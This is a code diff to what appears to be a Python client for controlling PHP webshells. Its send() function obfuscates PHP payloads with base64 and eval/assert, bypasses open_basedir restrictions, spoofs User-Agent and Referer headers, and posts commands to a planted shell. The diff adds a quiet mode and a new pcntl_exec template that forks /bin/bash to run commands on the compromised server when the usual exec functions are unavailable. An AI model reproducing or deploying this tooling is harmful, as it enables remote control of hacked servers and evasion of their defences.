@@ -234,9 +234,14 @@ def execute_sql_command(command, database: str = "", raw: bool = False):
     return ''
 
 
-def send(data: str, raw: bool = False, **extra_params):
+def send(phpcode: str, raw: bool = False, **extra_params):
+    # extra_params['quiet'] 不显示错误信息
     offset = 8
     encode_recv = False
+    quiet = False
+    if ("quiet" in extra_params):
+        del extra_params["quiet"]
+        quiet = True
 
     url = gget("webshell.url", "webshell")
     params_dict = gget("webshell.params_dict", "webshell").copy()
@@ -252,16 +257,16 @@ def send(data: str, raw: bool = False, **extra_params):
     tail = randstr("!@#$%^&*()[];,.?", offset)
     pwd_b64 = b64encode(
         gget("webshell.pwd", "webshell", "Lg==").encode()).decode()
-    raw_data = data
+    raw_data = phpcode
     if not raw:
         encode_head = "ob_start();" if encode_recv else ""
         encode_tail = """$ooDoo=ob_get_clean();
 $encode = mb_detect_encoding($ooDoo, array("ASCII",'UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
 $ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
 print(base64_encode($ooDoo));""" if encode_recv else ""
-        data = f"""error_reporting(0);{encode_head}chdir(base64_decode("{pwd_b64}"));print("{head}");""" + data
+        phpcode = f"""error_reporting(0);{encode_head}chdir(base64_decode("{pwd_b64}"));print("{head}");""" + phpcode
         if (gget("webshell.bypass_obd", "webshell")):
-            data = """$dir=pos(glob("./*", GLOB_ONLYDIR));
+            phpcode = """$dir=pos(glob("./*", GLOB_ONLYDIR));
 $cwd=getcwd();
 $ndir="./%s";
 if($dir === false){
@@ -272,26 +277,27 @@ ini_set("open_basedir","..");
 $c=substr_count(getcwd(), "/");
 for($i=0;$i<$c;$i++) chdir("..");
 ini_set("open_basedir", "/");
-chdir($cwd);rmdir($ndir);""" % (uuid4()) + data
-        data += f"""print("{tail}");{encode_tail}"""
-        data = f"""eval(base64_decode("{base64_encode(data)}"));"""
+chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
+        phpcode += f"""print("{tail}");{encode_tail}"""
+        phpcode = f"""eval(base64_decode("{base64_encode(phpcode)}"));"""
         if (not php_v7):
-            data = f"""assert(eval(base64_decode("{base64_encode(data)}")));"""
+            phpcode = f"""assert(eval(base64_decode("{base64_encode(phpcode)}")));"""
     for func in encode_functions:
         if func in encode_pf:
-            data = encode_pf[func].run(data)
+            phpcode = encode_pf[func].run(phpcode)
         elif ("doughnuts" in str(func)):
             _, salt = func.split("-")
-            data = encode_pf["doughnuts"].run(data, salt)
+            phpcode = encode_pf["doughnuts"].run(phpcode, salt)
     if (raw_key == "cookies"):
-        data = quote(data)
+        phpcode = quote(phpcode)
     params_dict['headers']['User-agent'] = fake_ua()
     params_dict['headers']['Referer'] = fake_referer()
-    params_dict[raw_key][password] = data
+    params_dict[raw_key][password] = phpcode
     try:
         req = Session.post(url, verify=False, **params_dict)
     except requests.RequestException:
-        print(color.red("\nRequest Error\n"))
+        if (not quiet):
+            print(color.red("\nRequest Error\n"))
         return
     if (req.apparent_encoding):
         req.encoding = encoding = req.apparent_encoding
@@ -372,6 +378,9 @@ def prepare_system_template(exec_func: str):
         SYSTEM_TEMPLATE = """$o=shell_exec(base64_decode("%s"));"""
     elif (exec_func == 'popen'):
         SYSTEM_TEMPLATE = """$fp=popen(base64_decode("%s"),'r');$o=NULL;if(is_resource($fp)){while(!feof($fp)){$o.=fread($fp,1024);}}@pclose($fp);"""
+    elif (exec_func == 'pcntl_exec'):
+        filename = uuid4()
+        SYSTEM_TEMPLATE = """$r='/tmp/%s';if(pcntl_fork() === 0) {$cmd = base64_decode("%s");$args = array("-c","$cmd 2>&1 1>$r");pcntl_exec("/bin/bash", $args);exit(0);}pcntl_wait($status);$o=file_get_contents('/tmp/%s');unlink('/tmp/%s');""" % (filename, "%s", filename, filename)
 
 
 def get_system_code(command: str, print_result: bool = True, mode: int = 0):
